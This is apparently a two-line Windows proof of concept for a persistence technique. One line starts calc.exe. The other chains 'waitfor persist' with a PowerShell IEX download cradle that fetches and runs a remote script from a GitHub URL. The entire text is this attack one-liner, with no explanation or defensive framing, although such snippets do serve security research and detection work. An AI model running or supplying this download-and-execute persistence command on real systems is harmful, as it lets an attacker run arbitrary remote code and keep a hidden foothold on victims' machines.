start-process calc.exe
cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1')
